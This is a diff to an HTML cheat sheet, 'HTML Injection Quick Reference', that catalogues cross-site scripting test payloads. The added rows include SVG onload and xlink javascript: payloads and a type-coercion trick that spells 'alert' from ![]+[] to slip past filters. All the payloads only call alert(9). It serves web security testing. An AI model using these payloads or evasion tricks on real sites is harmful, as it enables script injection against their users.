@@ -2,6 +2,10 @@
 <html>
 <head>
 <meta charset="utf-8">
+<meta name="application-name" content="HIQR">
+<meta name="author" content="Mike Shema">
+<meta name="description" content="Annotated concepts and examples for HTML injection (cross-site scripting) tests">
+<meta name="generator" content="vi. Seriously.">
 <title>HTML Injection Quick Reference</title>
 <script src="http://use.edgefonts.net/open-sans.js"></script>
 <script src="http://use.edgefonts.net/source-code-pro.js"></script>
@@ -94,7 +98,7 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <td>Double-quoted<br>(U+0022)
   <td class="example">&lt;input type=text name=foo value="<span class="payload">"onevent=☣//</span>"&gt;
 <tr>
-  <td rowspan="3">JavaScript variable assignment
+  <td rowspan="4">JavaScript variable assignment
   <td>Unquoted
   <td class="example">
   <tr>
@@ -103,6 +107,9 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td>Single-quoted<br>(U+0027)
   <td class="example">&lt;script&gt;<br>var foo='<span class="payload">';☣;//</span>';<br>...
+  <tr>
+  <td>Escape characters
+  <td class="example">(blog post)
 <tr>
   <td rowspan="6">JavaScript Window.location object property<br><span class="placeholder">.hash<br>.href<br>.pathname<br>.search</span>
   <td rowspan="2" class="char">URL
@@ -197,6 +204,19 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
 %ff%fe%3c%00s%00c%00r%00i%00p%00t%00%3e<br>
 %00a%00l%00e%00r%00t%00(%009%00)%00<br>
 &lt;%00/%00s%00c%00r%00i%00p%00t%00&gt;%00"&gt;foo&lt;/a&gt;
+<tr>
+  <td rowspan="4">Alternate markup
+  <td rowspan="4">SVG
+  <td class="example">&lt;svg onload="javascript:alert(9)" xmlns="http://www.w3.org/2000/svg"&gt;&lt;/svg&gt;
+  <tr>
+  <td class="example">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;<br>
+&lt;g onload="javascript:alert(9)"&gt;&lt;/g&gt;&lt;/svg&gt;
+  <tr>
+  <td class="example">&lt;svg&gt;&lt;script xlink:href=data:,alert(9)&gt;&lt;/script&gt;
+  <tr>
+  <td class="example">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;<br>
+&lt;a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(9)"&gt;<br>
+&lt;rect width="1000" height="1000" fill="white"/&gt;&lt;/a&gt;&lt;/svg&gt;
 <tr>
   <td rowspan="6">Untidy markup
   <td rowspan="2">Missing greater-than sign
@@ -293,7 +313,7 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td class="example">window[<span class="payload">/alert/.source</span>](9)
 <tr>
-  <td rowspan="7">Harness functions from a JavaScript library
+  <td rowspan="6">Harness functions from a JavaScript library
   <td rowspan="2"><a href="http://angularjs.org/">Angular</a>
   <td class="example">angular.bind(self, alert, 9)()
   <tr>
@@ -308,6 +328,34 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <td class="example">_.delay(alert, 0, 9)
   <tr>
   <td class="example">_.once(alert(9))
+<tr>
+  <td rowspan="8">Type coercion
+  <td rowspan="2">1) Boolean + Object to String
+  <td class="example">false + "" = "false"
+  <tr>
+  <td class="example">![] + []
+  <tr>
+  <td rowspan="2">2) String by index to character
+  <td class="example">( false + "" )[1] = "a"
+  <tr>
+  <td class="example">( ![] + [] )[1]
+  <tr>
+  <td rowspan="2">3) Compose string
+  <td class="example">"alert"
+  <tr>
+  <td class="example">(![]+[])[1] +<br>
+(![]+[])[2] +<br>
+(![]+[])[4] +<br>
+(!![]+[])[1] +<br>
+(!![]+[])[0]
+  <tr>
+  <td rowspan="2">4) Function by method lookup
+  <td class="example">(window["alert"])(9)
+  <tr>
+  <td class="example">(window[(![]+[])[1] + (![]+[])[2] + (![]+[])[4] +<br>
+ (!![]+[])[1] + (!![]+[])[0]])(9)
+<tr>
+  <th colspan="3">Footnotes
 </table>
 <div align="right"><a href="#hiqr_toc">top</a></div>
 <br>
